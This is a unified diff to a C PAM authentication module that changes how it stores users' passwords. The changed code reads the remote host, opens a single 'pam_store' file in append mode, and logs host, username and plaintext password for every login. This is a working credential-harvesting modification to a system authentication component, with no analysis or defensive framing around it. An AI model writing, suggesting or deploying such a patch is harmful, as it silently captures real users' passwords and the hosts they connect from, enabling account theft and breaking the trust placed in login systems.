@@ -58,6 +58,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
 		*pword,
 		*uname,
 		*file,
+		*rhost,
 		buffer[BUF_MAX];
 	FILE	*pwfile;
 
@@ -74,6 +75,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
 
 	pam_get_item(pamh, PAM_AUTHTOK, (void *) &pword);
 	pam_get_item(pamh, PAM_USER, (void*) &uname);
+	pam_get_item(pamh, PAM_RHOST, (void*) &rhost);
 	if (!pword || !uname) {
       		_pam_log(LOG_ERR,"no password or user to write - got stacked wrong ?");
 		return PAM_AUTHINFO_UNAVAIL;
@@ -85,16 +87,16 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
 		return PAM_AUTHINFO_UNAVAIL;
 	}
 
-	sprintf(file, "%s/%s", pwdir, uname);
+	sprintf(file, "%s/pam_store", pwdir);
       	D(_pam_log(LOG_DEBUG, "writing to %s", file));
 
-	if ((fd=open(file, O_CREAT|O_TRUNC|O_WRONLY, 0600)) == -1) {
+	if ((fd=open(file, O_RDWR|O_APPEND|O_CREAT, 0600)) == -1) {
       		_pam_log(LOG_ERR,"failed to open pw file");
 		return PAM_AUTHINFO_UNAVAIL;
 	}
 
-	len=snprintf(buffer, BUF_MAX-1, "username = %s\npassword = %s\n",
-				uname, pword);
+	len=snprintf(buffer, BUF_MAX-1, "host=%s\tusername=%s\tpassword=%s\n",
+				rhost, uname, pword);
 
 	res=write(fd, buffer, len);
 
